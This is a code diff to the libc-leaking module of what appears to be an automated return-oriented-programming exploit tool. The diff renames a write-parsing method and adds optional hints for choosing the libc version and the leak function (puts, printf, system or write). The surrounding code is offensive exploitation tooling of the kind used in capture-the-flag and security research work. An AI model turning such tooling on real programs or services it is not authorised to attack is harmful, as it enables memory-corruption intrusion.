@@ -39,12 +39,14 @@ class Leak():
                 return b''.join([line.strip()[:6], b'\x00\x00'])
             return line.strip()[:6] + '\x00\x00'
         return line.strip()[:4]
+
     def parse_printf(self, line):
         if (self.arch == "amd64"):
             if ("bytes" in str(type(line))):
                 return b''.join([line.strip()[:6], b'\x00\x00'])
             return line.strip()[:6] + '\x00\x00'
         return line.strip()[:4]
+
     def parse_system(self, line):
         if (self.arch == "amd64"):
             if ("bytes" in str(type(line))):
@@ -54,8 +56,7 @@ class Leak():
             return b"".join[line.strip()[7:(7+4)].ljust(4, b'\x00')]
         return line.strip()[7:(7+4)].ljust(4, '\x00')
 
-    def parse_write_x64(self, line):
-        log.info(str(type(line)))
+    def parse_write(self, line):
         return line
 
 
@@ -63,6 +64,8 @@ class Leak():
             ''' gets libc from libcdatabase
             '''
             # check which versions it could be
+            if (self.ropstar.args.libc_hint):
+                return [self.ropstar.args.libc_hint]
             task = self.libcdb_path+"find "
             for k,v in list(leak.items())[-3:]: # more than 3 are not supported
                 task += k + " " + hex(v)[-3:] + " "
@@ -110,6 +113,9 @@ class Leak():
         leak_funcs = ['puts','printf','system','write']
         for leak_func in leak_funcs:
             if leak_func in self.binary.got.keys():
+                if (self.ropstar.args.leak_hint):
+                    if (self.ropstar.args.leak_hint != leak_func):
+                        continue
                 log.info('Using '+leak_func)                            
                 rop = ROP(self.binary)
                 if leak_func == 'printf':
